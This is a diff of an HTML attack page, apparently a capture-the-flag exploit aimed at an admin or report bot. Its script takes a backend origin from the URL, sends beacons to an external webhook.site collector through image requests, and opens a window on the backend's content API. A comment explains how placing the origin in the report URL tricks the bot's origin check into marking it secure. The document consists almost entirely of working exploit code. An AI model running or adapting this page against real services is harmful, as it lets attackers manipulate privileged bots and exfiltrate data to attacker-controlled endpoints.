@@ -2,11 +2,14 @@
 <html><head><meta charset="utf-8"><title>a</title></head>
 <body><h1>loading</h1>
 <script>
-const B='http://backend:8080';
-const P='2';
+// backend origin from ?b=<origin> (default backend:8080). Putting it in the report URL
+// as ?b=http://host also makes the bot's arenaOrigin() mark that origin secure.
+const q = new URLSearchParams(location.search);
+const B = (q.get('b') || 'http://backend:8080').replace(/\/+$/,'');
+const P = '2';
 const WH='https://webhook.site/8033ef72-6b18-4fa8-a2f8-8a910a772789/S?';
 function bx(s){ new Image().src=WH+s+'&t='+Date.now(); }
-bx('step=loaded');
+bx('step=loaded&B='+encodeURIComponent(B));
 var w;
 try { w=window.open(B+'/api/content/'+P+'/1','x'); bx('step=opened&ok='+(w?1:0)); }
 catch(e){ bx('step=openerr&e='+encodeURIComponent(''+e)); }
